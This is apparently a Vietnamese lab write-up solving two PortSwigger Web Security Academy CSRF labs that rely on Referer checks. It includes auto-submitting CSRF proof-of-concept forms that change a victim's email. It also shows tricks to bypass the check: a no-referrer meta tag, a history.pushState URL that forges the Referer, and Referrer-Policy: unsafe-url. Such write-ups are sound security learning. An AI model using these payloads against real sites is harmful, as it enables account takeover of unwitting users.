...
![image](https://github.com/user-attachments/assets/fa819ba5-528b-4028-981e-2f74bc527378)

Đây là req khi đổi email:

![image](https://github.com/user-attachments/assets/fb43b7d1-793a-430d-8943-8b7eff6f17c1)

Tôi tạo 1 cái PoC và ấn view thì nó hiện cái này:

![image](https://github.com/user-attachments/assets/821e8221-dcd6-4aee-855d-b5399263add2)

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a6200210449f1d881401b0b008d0096.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="namdt5125&#64;nam&#46;com" />
...
Nó liên quan đến cái Referer, thêm cái `<meta name="referrer" content="no-referrer">` để bỏ cái Referer đi, điều này được chứng minh là nếu xóa Referer ở req đổi mail thì nó vẫn đổi được
...
<meta name="referrer" content="no-referrer">
    <form action="https://0a6200210449f1d881401b0b008d0096.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="namsdadt5125&#64;nam&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
...
![image](https://github.com/user-attachments/assets/95ca5dd9-0db5-4af1-821b-bdbdfee96d61)

<h1>---------------------------------------------------------</h1>
<br>

![image](https://github.com/user-attachments/assets/dcda5182-b664-4a12-9dc6-4950e8377ecd)

Đây là req đổi email

![image](https://github.com/user-attachments/assets/faad2076-64c8-4924-a279-80bb7349bf53)

Như bài trước, tôi tạo PoC và đưa vào exploit để xem và nó ra như này:

![image](https://github.com/user-attachments/assets/43cfebca-26b5-4da4-8d51-904988eba706)

Mặc dù có thêm `<meta name="referrer" content="no-referrer">` nhưng vẫn bị ẩn đi, tôi thử xóa Referer ở req thì nó hiện ra invalid,

![image](https://github.com/user-attachments/assets/60636581-d88a-4649-be69-1ea97db7e919)

Tôi chèn thêm cái subdomain vào trước và nó vẫn gửi được cái req `Referer: https://gdfg.0a8000bc03fb0d1987dbe335003c0050.web-security-academy.net/my-account`:

![image](https://github.com/user-attachments/assets/574afd98-f9e2-4a90-a512-a1a2c1a264a2)

Chỉnh lại cái PoC 1 chút, `history.pushState('', '', '/');` lệnh này được dùng để thay đổi URL trên trình duyệt mà không tải lại trang, đổi / thành cái link kia là làm sạch lịch sử trình duyệt, che giấu URL gốc, tránh bị phát hiện:

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
        <form action="https://0a8000bc03fb0d1987dbe335003c0050.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="dassfgnfgdf@fds.cosdm">
        </form>

        <script>
            history.pushState('', '', '/?0a8000bc03fb0d1987dbe335003c0050.web-security-academy.net')
            document.forms[0].submit();
        </script>
    </body>
</html>
```
Thêm cả `Referrer-Policy: unsafe-url` với mục đích là không quan tâm đến việc trang đích có cùng hoặc khác nguồn gốc (same-origin/cross-origin)

![image](https://github.com/user-attachments/assets/1297e776-2014-4042-9ba7-5085d1307889)

![image](https://github.com/user-attachments/assets/1cc16df4-e0fa-4253-b729-035a7abc7940)
